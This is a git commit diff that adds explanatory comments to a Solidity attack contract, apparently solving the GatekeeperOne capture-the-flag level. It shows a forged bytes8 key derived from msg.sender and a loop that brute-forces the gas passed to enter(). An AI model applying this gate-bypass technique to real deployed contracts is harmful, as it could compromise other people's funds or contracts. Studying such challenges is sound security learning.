a140cad1fd9531b6088e3e43fc5ac1eaa56e70c2
Aleksa Pantic <150276227+10ap17@users.noreply.github.com>
2024-04-04 23:54:40 +0200

    Update GatekeeperOne_Attack.sol

--- GatekeeperOne/GatekeeperOne_Attack.sol
+++ GatekeeperOne/GatekeeperOne_Attack.sol
@@ -6,9 +6,13 @@ interface IGatekeeperOne{
 }
 contract Attack{
     function attack(IGatekeeperOne gate)external{
+        //first gate is passed by calling the function enter() from this contract
         
+        //to pass the second gate we are using the next line of code
         bytes8 key= bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
-         for (uint256 i = 0; i < 8191; i++) {
+
+        //to pass the third gate we are calling function enter() until the result is true
+        for (uint256 i = 0; i < 8191; i++) {
       (bool result,) = address(gate).call{gas: i+(8191 * 3) }(abi.encodeWithSignature("enter(bytes8)", key));
       if(result)
         {
